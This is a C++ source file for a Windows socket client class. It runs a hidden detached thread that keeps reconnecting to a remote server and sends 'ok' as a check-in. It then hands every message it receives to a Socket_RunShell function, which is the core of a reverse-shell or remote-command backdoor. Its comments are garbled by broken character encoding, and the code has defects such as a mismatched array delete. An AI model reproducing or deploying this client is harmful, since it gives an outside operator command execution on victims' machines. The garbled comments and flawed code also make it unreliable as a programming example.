#include <pch.h>
#ifndef CSocketClass_CPP
#define CSocketClass_CPP
#include "CSocket.h"

int CSocketClass::Entrance() {
	if (!hasThread) {
		hasThread = true; // ���Ϊ�߳�����
		Loading();
		std::thread a(&CSocketClass::SocketStart, this); a.detach(); // �������߳����Բ����Ϊ�ر�
		//SocketStopFlac = false; // Socket��ʼ
		//hasThread = false; // ���Ϊ�̹߳ر�
	}
	return 0;
}
void CSocketClass::SocketStart() {
	WSADATA wsaData;
	WSAStartup(0x0202, &wsaData);
	SOCKET tempClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //�����ͻ����׽���
	SOCKADDR_IN server = Socket_Initialization();

	/* Connect */
	int result; //����
	while (!SocketStopFlac) {
		result = connect(tempClient, (struct sockaddr*) & server, sizeof(SOCKADDR_IN)); //����
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK || err == WSAEINVAL) {
				Sleep(3000);
				continue;
			}
			else if (err == WSAEISCONN) { break; } //��������״̬
			else {
				Sleep(3000);
				continue;
			}
		}
	}

	/* Send */
	std::string SendStr = GetFirstSendData(); //��ȡ�û��ַ���(����ָ��)
	if (Send_Socket(tempClient, SendStr)) { sClient = tempClient; } // ����ɹ��ͷ���ȫ�ֱ���
	else if (!SocketStopFlac) { goto GOTOresetSocket; } //ʧ������

	if (!SocketStopFlac) {
		/* While Recv */
		std::thread RecvSocket(&CSocketClass::Recv_Socket_While, this, sClient); RecvSocket.detach(); //ѭ��Send

		/* While Send */
		std::thread SendSocket(&CSocketClass::Send_Socket_While, this, sClient); SendSocket.detach();

		while (!SocketStopFlac) {
			Sleep(1000);
		}
	}

	/* Reset Socket */
	if (0) { // �����Ҫ��������
	GOTOresetSocket:
		Sleep(1000);
		SocketStart();
	}

	/* Stop Socket */
	SocketStop(sClient);
	hasThread = false; // �߳̽���
	SocketStopFlac = false; // ����
	WSACleanup();
}
void CSocketClass::SocketStop(SOCKET socket) {
	// �ͷ����Ӻͽ��н�������      
	closesocket(socket);
	socket = NULL;
}
void CSocketClass::Recv_Socket_While(SOCKET socket) {
	while (!SocketStopFlac) {
		std::vector<std::string> Recv_Cache;
		if (!Recv_Socket(socket, &Recv_Cache)) { SocketStopFlac = true; break; } // �˳��߳�
		if (Recv_Cache.empty()) { continue; }
		for (std::string data : Recv_Cache) {
			Socket_RunShell(data);
		}
	}
}
bool CSocketClass::Send_Socket(SOCKET socket, std::string data) {
	int result; //send result
	while (true) {
		if (w) { data = flac_Start + data + flac_End; } // ��Ҫ����w����
		result = send(socket, data.c_str(), (int)data.size(), 0); //��������
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK) {
				Sleep(100);
				continue;
			}
			else { //����ʧ��
				//SocketStop(socket);
				return false;
			}
		}
		return true;
	}
}
bool CSocketClass::Recv_Socket(SOCKET socket, std::vector<std::string>* allResult) {
	/* Initialization */
	int result; // , result_old = 0; //recv result   [result_old ���ڼ��������Ƿ��쳣�˳�]
	int ConfigCache = socketCache; //���õĻ����С
	char* result_byte = new char[ConfigCache]; //��������byte
	std::string allData = ""; //�Ѿ���������
	ULONG MoreLen; //ʣ�µ����ݴ�С

	/* While Reve */
W_recv:
	while (true) {
		result = recv(socket, result_byte, ConfigCache - 1, 0); //��������(��Ҫ��ӽ����������-1)
		//if (result_old == 0 && result == 0) { return false; }
		//result_old = result; // ��¼�ϴλ�ȡ�ĳ���
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK) { continue; }
			else { return false; } //����ʧ��
		}
		// �Ƿ�����ʱ����
		if (!recvTemp.empty()) { allData = recvTemp; recvTemp = ""; }
		/* Recv */
		result_byte[result] = 0x00; //��ӽ������
		allData += std::string(result_byte, result); //Cache >> AllResult
		memset(result_byte, 0, ConfigCache); //���֮ǰ������
		ioctlsocket(socket, FIONREAD, &MoreLen); //���ʣ�µ�����
		if (MoreLen == 0) { //�������
			// ��Ҫ����w����
			if (w) {
				int findStart, findEnd;
				while ((findStart = (int)allData.find(flac_Start)) != -1 && findStart < allData.length() && (findEnd = (int)allData.find(flac_End, findStart)) != -1) {
					// �ȷ����ݣ����޸�����
					int subStart = findStart + (int)flac_Start.length();
					std::string onlyData = allData.substr(subStart, findEnd - subStart);
					if (onlyData.empty()) { continue; }
					while (true) { // ������ݰ����ң�����ǰ��һ����
						int findStart_ = (int)onlyData.find(flac_Start);
						if (findStart_ == -1) { break; }
						onlyData = onlyData.substr(findStart_ + (int)flac_Start.length());
					}
					allResult->push_back(onlyData);
					allData = allData.substr(findEnd + flac_End.length());
				}
				// ���������ʱ���ݾʹ�����(û��Ҫ�ж�)
				recvTemp = allData;
				if (!allResult->empty()) { goto W_success; }
			}
			// ����Ҫ����w����
			else {
				allResult->push_back(allData);
				goto W_success;
			}
		}
		goto W_recv;
	}
W_success:
	delete result_byte;
	return true;
}
std::string CSocketClass::GetIpByName(std::string a) {
	std::string result = "";
	struct addrinfo hints;
	struct addrinfo* res;
	struct sockaddr_in* addr;
	char ipbuf[16];
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET; /* Allow IPv4 */
	hints.ai_flags = AI_PASSIVE; /* For wildcard IP address */
	hints.ai_protocol = 0; /* Any protocol */
	hints.ai_socktype = SOCK_STREAM;
	int i = getaddrinfo(a.c_str(), NULL, &hints, &res);
	if (i == -1) { return ""; }
	if (res == NULL) { return ""; }
	addr = (struct sockaddr_in*)res->ai_addr;
	return inet_ntop(AF_INET, &addr->sin_addr, ipbuf, 16);
}
std::string CSocketClass::GetFirstSendData() {
	return "ok";
}
#endif